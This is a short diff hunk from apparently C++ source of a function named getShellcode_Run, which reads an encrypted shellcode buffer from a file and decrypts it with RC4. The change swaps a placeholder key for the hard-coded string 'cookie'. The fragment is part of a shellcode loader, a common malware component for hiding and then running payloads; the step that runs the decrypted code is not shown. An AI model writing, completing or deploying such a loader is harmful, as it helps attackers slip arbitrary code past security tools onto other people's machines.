@@ -150,7 +150,7 @@ void getShellcode_Run(const char* filename) {
    }
 
    // Decrypt the shellcode using RC4
-   const unsigned char* key = reinterpret_cast<const unsigned char*>("your_actual_key_here"); // Replace with your actual key
+   const unsigned char* key = reinterpret_cast<const unsigned char*>("cookie"); // Replace with your actual key
    std::vector<unsigned char> decryptedBuffer(size);
    
    RC4(key, encryptedBuffer.data(), decryptedBuffer.data(), size);
